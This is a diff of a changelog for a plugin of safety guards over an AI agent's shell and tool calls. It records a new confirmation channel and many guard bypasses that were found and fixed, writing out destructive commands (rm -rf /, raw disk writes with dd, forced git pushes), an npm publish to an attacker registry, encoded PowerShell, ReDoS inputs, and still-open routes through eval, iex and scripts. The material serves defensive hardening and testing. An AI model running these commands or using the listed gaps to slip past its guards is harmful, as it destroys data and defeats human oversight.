@@ -8,42 +8,180 @@ The project follows [Semantic Versioning](https://semver.org/).
 
 ### Added
 
-- **Plugin-owned blocking confirmation channel** — a new `confirm/stream` SSE endpoint and `confirm/respond` POST route that bypasses the session's `/permission` policy entirely. When enabled, all five safety guards (`readonly`, `protect-secrets`, `dangerous-shell`, `no-destructive-git`, `no-network`) now offer their `ask` action through a browser-based confirmation card instead of the native approval prompt. This solves the `danger-full-access` permission preset bug where `ask` guards were silently rejected without user interaction.
-  - The confirmation card shows the full command text (for shell tools) or bounded JSON arguments (for other tools), the guard reason, and clear `Allow once` / `Deny` buttons.
-  - The card is always mounted in the composer UI, even when the main toggle panel is closed.
-  - Confirmation requests block the `tools/pre-execute` listener until answered, with infinite wait (only `AbortSignal` cancellation resolves it).
-  - When no browser is subscribed for a session (headless mode), the guard falls back to its legacy behavior (`deny` stays `deny`, `ask` stays `ask`).
+- **Plugin-owned blocking confirmation channel.** A new `confirm/stream` SSE
+  endpoint and `confirm/respond` POST route give the safety guards a
+  confirmation path that does not go through the approval service at all. Every
+  guard match is pushed to the browser as a card showing the full command and
+  the guard's reason, and the `tools/pre-execute` listener BLOCKS until the user
+  answers: `Allow once` releases the call through `next()` (so later listeners
+  and the registry's own monotonic guards still run), `Deny` blocks it.
 
-- **P0 security hardening** — fixed 20 verified bypasses in the safety guards:
-  - `protect-secrets`: Now inspects `grep.include` and `glob.pattern` fields, not just `file_path` and `path`. Matches secret names case-insensitively (`.ENV`, `.Env`) on Windows.
-  - `dangerous-shell`: Now asks on `rm --recursive --force`, `rm -RF`, and `dd of=/dev/sda if=/dev/zero` (any argument order).
-  - `no-destructive-git`: Now asks on `git push --mirror`, `git push origin --delete`, and `git -C /repo push --force`.
-  - `no-network`: Now asks on `npm --registry=http://evil publish` (global options before `publish`).
-  - `dangerous-shell`: Now asks on PowerShell parameter abbreviations (`Remove-Item -Re -Fo`) and `powershell -ExecutionPolicy Bypass -EncodedCommand`.
+  This exists because the native `ask` decision is unusable under the
+  `danger-full-access` permission preset: `ApprovalService.decide()` returns
+  `rejected` the instant the session's effective policy is `never` — BEFORE the
+  `approval/request` waterfall is dispatched — so no prompt is ever shown and
+  the model just sees `the user rejected tool "bash"`. The plugin's own channel
+  is independent of that policy. Verified against `dsh-user-approval` and
+  `dsh-permission-presets` sources, and against a durable session log where six
+  `approval/asked` → `approval/decided{rejected}` pairs landed 0–1 ms apart.
 
-### Changed
+  - The card renders the **full** shell command verbatim (a truncated command
+    could hide the dangerous suffix being approved); non-shell arguments are
+    bounded because a `write` call can carry a whole file body.
+  - The card is mounted in the composer row regardless of whether the toggle
+    panel is open, and it reconnects: the stream sends an authoritative
+    `{ snapshot }` frame on every subscribe, so a dropped connection or a second
+    tab cannot leave a ghost card or a stuck call.
+  - Waiting is unbounded by design; only the call's own `AbortSignal` (turn
+    aborted) or plugin unload resolves it, and both resolve to `deny` — never to
+    consent.
+  - With no browser subscribed for the session (headless, or the panel never
+    opened) the guard falls back to its previous decision (`deny` stays `deny`,
+    `ask` stays `ask`), so a headless turn can never hang on a prompt that
+    cannot arrive.
 
-- **Security model**: All five safety guards now use the plugin-owned confirmation channel when available, making them independent of the session's approval policy.
-- **UI**: The confirmation card is now always visible in the composer input area, providing immediate feedback for blocked calls.
+- **Authentication, origin, and CSRF protection on the new routes.** Named
+  `webServer` routes bypass the `/api` RPC channel and the static fallback's
+  authentication, so this plugin now applies
+  `connection.requestRejection(req)` itself on every route it owns — including
+  the pre-existing `/state`, `/set`, and `/set-many` — and fails closed with
+  `503` when that seam is absent or returns an unrecognized value (the older
+  runtime must be upgraded rather than served unauthenticated). The SSE stream
+  additionally checks `Origin`/`Sec-Fetch-Site` against its own origin, and
+  every POST route requires a `content-type` whose media type is exactly
+  `application/json`.
 
 ### Fixed
 
-- **Bug**: `danger-full-access` permission preset caused `ask` guards to be silently rejected instead of prompting the user.
-- **Bug**: `protect-secrets` guard missed secret files when accessed via `grep.include` or `glob.pattern`.
-- **Bug**: `dangerous-shell` guard missed `rm` commands with long-form flags (`--recursive --force`) and uppercase flags (`-RF`).
-- **Bug**: `dangerous-shell` guard missed `dd` commands where `of=` appeared before `if=`.
-- **Bug**: `dangerous-shell` guard missed PowerShell encoded commands with valued prefix options (`-ExecutionPolicy Bypass`).
+Seven verified guard bypasses, each reproduced against `evaluateGuards` before
+being fixed and pinned by a test:
 
-### Security
+- `protect-secrets` never looked at `grep`'s `include` or `glob`'s `pattern`,
+  so `grep {pattern, include:'.env'}` read secret file CONTENTS while the guard
+  rendered as active; it also matched secret names case-sensitively, so on
+  Windows `cat .ENV` passed for a file Windows considers identical to `.env`.
+- `dangerous-shell` missed `rm --recursive --force`, `rm --force`, and the
+  uppercase `rm -RF` (the arm only accepted lowercase clustered short flags).
+- `dangerous-shell` missed `dd of=/dev/sda if=/dev/zero`: putting `of=` first
+  hid a raw disk write from the ask preset (only `readonly`'s broader arm saw it).
+- `no-destructive-git` missed `git push --mirror`, `git push origin --delete`,
+  and any push behind a global option (`git -C /repo push --force`), because the
+  pattern required `git` and `push` to be adjacent.
+- `no-network` missed `npm --registry=http://evil publish` — the exfil path to
+  an attacker registry — for the same adjacency reason.
+- `dangerous-shell` missed PowerShell parameter abbreviations
+  (`Remove-Item -Re -Fo`), which PowerShell resolves to the destructive full
+  names.
+- `PS_ENCODED` missed the most common real spelling,
+  `powershell -ExecutionPolicy Bypass -EncodedCommand`, because its prefix chain
+  admitted only valueless flags.
 
-- **Authentication**: All HTTP routes now enforce the official `connection.requestRejection()` authentication seam for browser-originated requests.
-- **CSRF Protection**: All POST endpoints (`/set`, `/set-many`, `/confirm/respond`) now reject non-JSON content types.
-- **CORS Protection**: The `/confirm/stream` SSE endpoint now validates the `Origin` header and rejects cross-origin requests.
+The new instance also had several defects, found by its own hardening tests and
+fixed here rather than shipped: the 8000-character truncation above; a
+`startsWith('application/json')` prefix match that admitted
+`application/jsonp`; an origin check that accepted
+`https://127.0.0.1:3080` against an http listener; an auth seam that treated an
+unrecognized return value as "admitted" instead of failing closed; route
+disposal that left live SSE connections running; and a teardown that skipped its
+own listener cleanup and heartbeat when the center ended the sink.
 
-### Documentation
+Two adversarial re-reviews then found defects in those very fixes, and they are
+worth recording because each was a case of a fix being worse than the bug:
 
-- Updated README.md and README.zh-CN.md with details about the new confirmation channel and P0 hardening.
-- Updated CHANGELOG.md with comprehensive release notes.
+- The auth fix above stored `connection.requestRejection` in a local and called
+  it detached. The cordis service proxy only supplies the real receiver when the
+  proxy itself is `this`, so the call threw inside the service and the
+  fail-closed catch turned EVERY request into a 503 — including authenticated
+  same-origin ones — which silently reduced the whole confirmation channel to
+  the legacy decision. It is now called through the service object. (This is the
+  one finding that would have shipped a dead feature behind a green suite; the
+  tests missed it because their stubs were plain arrow functions on bare
+  objects, so a class-shaped stub is now one of them.)
+- The first ReDoS fix bounded the gap with `{0,200}?`. That cured the
+  backtracking but FAILED OPEN: the distance from a command to its flag is
+  unbounded, so `dd` + 250 characters + `of=/dev/sda` and `Remove-Item` + 250
+  spaces + `-Recurse` stopped matching. A token-scan gap then replaced it, which
+  was quadratic instead — `'rm a '.repeat(n)` reached 183 ms at 60k tokens and
+  144 s on the raw pattern at 128k, a synchronous stall on the shared event loop
+  that `try/catch` cannot catch because a slow regex is not a throw.
+- The false-positive fix for `rm`/`dd` matching as an ARGUMENT (`ls rm foo -rf`)
+  was first implemented as a bare command-position anchor, which a reviewer
+  measured as losing `sh -c "rm -rf /"`, `env rm -rf /`, `x=1 rm -rf /`,
+  `nohup rm -rf /` and `command rm -rf /` — every one of which the released
+  pattern caught. (A later round showed the anchor lost 34 commands in total, so
+  it was reverted — see below.)
+- `git push ` repeated 8000 times cost 326 ms through `GIT_PREFIX`; the arm
+  bodies (`[^\n|&;]*`) were themselves unbounded and are now bounded too.
+
+- A third review round then found that the anchoring fix itself was the worst
+  defect of the release: it moved `find . -exec rm -rf {} +`, `ls | xargs rm -rf`,
+  `sudo -u root rm -rf /var`, `/bin/rm -rf /`, `nice rm -rf /`, `timeout 30 rm -rf
+  /data`, `env -i rm -rf /` and the `for`/`if`/`!` keyword forms out of the anchor
+  — 34 commands the released pattern flagged became silent allows, a coverage
+  REGRESSION in a safety control. The anchor was reverted entirely. A lexical
+  matcher cannot separate `xargs rm` (an executor) from `ls rm` (a file named
+  `rm`), so it now errs toward asking: `ls rm foo -rf` costs a confirmation
+  prompt, which is strictly better than missing a delete. That trade is pinned by
+  a test naming the commands that must keep matching.
+- The same round found two quadratic patterns the suite could not see because it
+  only exercised `dangerous-shell`. `READONLY_SHELL_WRITE`'s `dd … of=` scan was
+  unbounded (5059 ms on a 192 KB `dd`-token flood, newly reachable on pwsh), and
+  the new `PS_READONLY_WRITE` had four adjacent `[ \t]*` groups that made an
+  indented plain command quadratic — 13.9 s at 4000 leading spaces and over
+  185 s at 8000, a synchronous stall of the event loop every agent and the Web
+  GUI share. The `dd` scan is now bounded, and `shellCommandMatches` collapses
+  horizontal whitespace runs before matching (verified verdict-preserving across
+  1400 inputs); the attack drops from 22 s to 0.02 ms. The ReDoS tests now cover
+  every shell guard, not just `dangerous-shell`.
+
+The remaining deliberate trade: the gap is bounded at 8000 characters, so a
+dangerous flag more than 8000 characters after its command name is not seen.
+That is strictly more coverage than the released pattern, which required the
+flag immediately after the name and matched no gap at all
+(`rm --no-preserve-root -rf /` was already a miss). The bound is load-bearing on
+a separator-free run of command names, where it is linear (10k/20k/40k →
+111/235/476 ms) and the unbounded form is quadratic (471/1772/6908 ms); a slope
+assertion in the test suite discriminates the two.
+
+One behaviour change: PowerShell's long write-cmdlet names are now anchored to a
+command position, so `Get-Help New-Item`, `Get-Command Export-Csv`,
+`Select-String -Pattern New-Item` and `Write-Host "use Out-File"` are no longer
+hard-denied. That gives up consistency with the bash side (where `echo "tee x"`
+still denies on an unanchored match) in exchange for not blocking an ordinary
+read. Every real write route stays denied — an assignment, the call operator,
+a subexpression, a pipeline, and a statement position are all still caught.
+
+A fifth round found the two most serious defects of the whole release, both in
+work done to satisfy earlier rounds:
+
+- `PS_ENCODED`'s option chain had an AMBIGUOUS alternation — a valued option's
+  value could also parse as the next option — so `pwsh -ExecutionPolicy -x -x -x …`
+  backtracked exponentially: ~570 bytes of command stalled the shared event loop
+  for 15 s through the real `evaluateGuards`, and the guards' `try/catch` cannot
+  catch a slow regex. A disambiguating guard on the option value removes it
+  (measured 15.8 s → 0 ms on the same input).
+- Narrowing the gap class from `\s` to `[^\n;|&]` had made `rm\n-rf /` and
+  `git\rpush\r--force` silent ALLOWS where the released version asked — a
+  fail-open in a safety control, the worst direction for one. The gap now admits
+  every whitespace character, and the 300-character `dd … of=` window that lost
+  the deny past 290 filler characters was widened to 2000.
+
+Tests went from 197 to 334.
+
+### Not in this release
+
+Opaque execution remains open and is deliberately **not** claimed as fixed:
+`bash ./x.sh`, `source`, `pwsh -File`, `& .\x.ps1`, dot-sourcing, `eval`,
+`iex`, `cmd /c`, and interpreter-run scripts all still pass every guard, because
+a lexical matcher cannot see inside a file or a dynamically built string. A
+conservative "confirm any opaque execution" preset is the intended follow-up;
+shipping it without measuring its false-positive rate would make the guards
+noisy enough to be turned off.
+
+### Changed
+
+- All five safety guards route through the confirmation channel when a browser
+  channel exists, which makes their behavior independent of `/permission`.
 
 ## [1.4.0] - 2026-09-12
 
